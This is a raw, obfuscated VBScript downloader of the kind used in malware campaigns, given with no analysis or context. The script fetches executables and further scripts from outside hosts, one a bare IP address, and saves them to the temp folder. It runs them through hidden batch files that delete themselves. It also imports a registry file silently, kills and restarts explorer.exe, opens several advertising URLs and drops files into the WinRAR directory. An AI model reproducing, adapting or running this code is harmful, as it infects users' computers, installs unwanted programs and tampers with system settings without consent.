on error resume next
aeq10096="http://e7.china.sogou.google.baidu.com.baidu163so.info"
Set b8z4pem3= WScript.CreateObject("WScript.Shell") 
Set m1126801z = Wscript.CreateObject("Scripting.FileSystemObject") 
cv2c7g3o=b8z4pem3.ExpandEnvironmentStrings("%temp%")
wik2b4e9 = left(cv2c7g3o,3)

b8z4pem3.Run("http://ww"&"w.xs"&"p5.info/index7.htm")

Sub c13o71xv6(t1o4hi87r)
Set ee40an7s= CreateObject("scripting.FileSystemObject") 
If Not ee40an7s.FolderExists(t1o4hi87r) Then
  ee40an7s.CreateFolder t1o4hi87r
End If
Set ee40an7s = Nothing 
end sub

Call c13o71xv6(wik2b4e9&"Progra~1\WinRAR\ico")
Call c13o71xv6(wik2b4e9&"WINDOWS1")

t198y5n8=wik2b4e9&"WINDOWS1\"
ico1=wik2b4e9&"Progra~1\WinRAR\ico\"

Sub g636k7f4(q11n6xoh9,w18r76r8d)
Set j17j7s287 = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
Set k14qm33y2 = CreateObject("ADOD"&"B.Strea"&"m")
with j17j7s287
.Open "GET",q11n6xoh9,0
.Send()
end with
b=j17j7s287.responseBody
with k14qm33y2
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("j17j7s287.res"&"po"&"nse"&"Bod"&"y")
.SaveToFile w18r76r8d,eval ("2")
end with
k14qm33y2.close
end sub

Sub d1cu206df(e15y4juz5,f1p62580t)
Set r1u015e9n = CreateObject("Scripting.FileSystemObject")
If r1u015e9n.FileExists(e15y4juz5) Then                   '´æÔÚ
       r1u015e9n.deletefile(e15y4juz5)
End If
    Set g11tu9bkw=r1u015e9n.CreateTextFile(e15y4juz5,False)
    g11tu9bkw.WriteLine(f1p62580t)
    g11tu9bkw.WriteLine("de"&"l %"&"0 ")
    g11tu9bkw.Close       
Set r1u015e9n  = Nothing
end sub

call g636k7f4(aeq10096&"/ico/tb.ico",ico1&"tb.ico")

for i=1 to 6
call g636k7f4(aeq10096&"/ico/"+cstr(i)+".ico",wik2b4e9&"Progra~1\WinRAR\ico\"+cstr(i)+".ico")
next

call g636k7f4(aeq10096&"/dy/xing.txt",cv2c7g3o&"\xing.vbs")
rlmbgxi4=cv2c7g3o&"\xingxing.bat"
call  d1cu206df(rlmbgxi4,"start %Temp%\xing.vbs")
cmd=b8z4pem3.RUN(rlmbgxi4, runhide)

'call g636k7f4(aeq10096&"/dy/qq1.html",cv2c7g3o&"\qq.exe")
'b8z4pem3.Run cv2c7g3o&"\qq.exe",,True

call g636k7f4("http://222.217.240.30/soft/gua"&"gua4397.exe",cv2c7g3o&"\guagua4397.exe")
rlmbgxi4=cv2c7g3o&"\guagua.bat"
call  d1cu206df(rlmbgxi4,"start %Temp%\guagua4397.exe")
cmd=b8z4pem3.RUN(rlmbgxi4, runhide)

call g636k7f4(aeq10096&"/dy/bbtbb.html",cv2c7g3o&"\bbtbb.exe")
call d1cu206df(cv2c7g3o&"\dian.bat","start %Temp%\bbtbb.exe")
cmd=b8z4pem3.RUN(cv2c7g3o&"\dian.bat", runhide)

call g636k7f4(aeq10096&"/go/page.txt",cv2c7g3o&"\page.vbs")
rlmbgxi4=cv2c7g3o&"\pagepage.bat"
call  d1cu206df(rlmbgxi4,"start %Temp%\page.vbs")
cmd=b8z4pem3.RUN(rlmbgxi4, runhide)

call g636k7f4("http://222.217.240.30/soft/uaua4397.exe",cv2c7g3o&"\uaua4397.exe")
rlmbgxi4=cv2c7g3o&"\ua2.bat"
call  d1cu206df(rlmbgxi4,"start %Temp%\uaua4397.exe")
cmd=b8z4pem3.RUN(rlmbgxi4, runhide)

WScript.Sleep 10000
b8z4pem3.Run ("http://www.19885.info/?gg")

WScript.Sleep 10000
b8z4pem3.Run ("http://www.19858.info/?gg")

WScript.Sleep 10000
b8z4pem3.Run ("http://www.19856.info/?gg")

rlmbgxi4=cv2c7g3o&"\ie.reg"
call g636k7f4(aeq10096&"/go/ie.txt",rlmbgxi4)
b8z4pem3.Run "regedit /s "&rlmbgxi4

godddd="cmd /c taskkill /f /im explorer.exe"
b8z4pem3.Run godddd,0,true
b8z4pem3.Run "explorer.exe"

call g636k7f4(aeq10096&"/go/safe.txt",cv2c7g3o&"\safe.vbs")
b8z4pem3.Run cv2c7g3o&"\safe.vbs",,True
